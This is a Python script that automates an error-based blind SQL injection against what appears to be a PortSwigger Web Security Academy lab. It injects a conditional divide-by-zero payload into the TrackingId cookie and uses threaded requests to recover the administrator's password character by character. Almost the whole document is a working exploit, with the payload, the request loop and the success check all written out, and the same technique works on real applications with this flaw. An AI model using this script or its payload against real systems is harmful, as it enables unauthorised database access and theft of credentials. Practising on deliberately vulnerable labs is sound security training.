import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
# The target URL that processes the request and cookie
URL = "https://0ae3006e030d858d811af79b0026009b.web-security-academy.net/"

# *** CRITICAL CHANGE: Updated base cookie value based on your manual test ***
# The payload starts immediately after this part.
BASE_TRACKING_ID = ""

# The session cookie value (ensure this is current)
SESSION_COOKIE = ""

# The length of the password to find
PASSWORD_LENGTH = 20

# The character set to test (a-z and 0-9)
ALPHABET = string.ascii_lowercase + string.digits

# The status code that indicates a successful injection (Internal Server Error)
ERROR_INDICATOR = 500

# Maximum number of threads for parallel requests
MAX_WORKERS = 10

# --- Script Logic ---

found_password = ['_'] * PASSWORD_LENGTH
print(f"Starting error-based blind SQLi attack. Target password length: {PASSWORD_LENGTH}")
print("Character set: a-z, 0-9")

def construct_payload(position, char):
    """
    Constructs the full SQL injection payload for a given position and character.
    Payload: '||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    """
    # Note: URL-encoding is not strictly required here as 'requests' handles the Cookie header
    # but the SQL syntax remains the same.
    payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    return payload

def check_character(position, char):
    """
    Sends an HTTP request with the character payload and checks the response status.
    """
    # 1-based index for SQL SUBSTR, so use (index + 1)
    sql_payload = construct_payload(position + 1, char)
    
    # Construct the full Cookie key-value pair, inserting the payload
    # between the base tracking ID and the session ID.
    full_cookie = f"TrackingId={BASE_TRACKING_ID}{sql_payload}; session={SESSION_COOKIE}"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Cookie": full_cookie
    }

    try:
        response = requests.get(URL, headers=headers, timeout=5) 
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error at position {position+1} with char '{char}': {e}")
        return None, None

    # Check for the error indicator (HTTP 500 status code)
    if response.status_code == ERROR_INDICATOR:
        return position, char  # Success! Found the character
    else:
        return None, None  # Character is incorrect

def main():
    """ The main script loop to iterate through all positions and characters. """
    for position in range(PASSWORD_LENGTH):
        # We will test all characters for the current position in parallel
        futures = []
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            for char in ALPHABET:
                # Submit the check_character task to the thread pool
                future = executor.submit(check_character, position, char)
                futures.append((future, char))

            # Wait for any of the tasks to complete with a successful result
            found = False
            for future, char in futures:
                pos, found_char = future.result()
                
                if found_char:
                    found_password[pos] = found_char
                    print(f"[+] Found character: {found_char} at position {pos + 1}. Current password: {''.join(found_password)}")
                    found = True
                    # Once a character is found, cancel remaining checks for this position
                    for f, c in futures:
                        f.cancel()
                    break # Break out of future loop

            if not found:
                 # If no character was found, something is wrong with the alphabet or the logic
                print(f"[-] Could not find character for position {position + 1}.")
                break
                
        # Small delay between positions
        time.sleep(0.5) 

    final_password = "".join(found_password)
    if not '_' in final_password:
        print("\n[VULNERABILITY FOUND] Final Password:")
        print(final_password)
    else:
         print("\n[FAILED] Script finished, but password was not fully recovered.")

if __name__ == "__main__":
    main()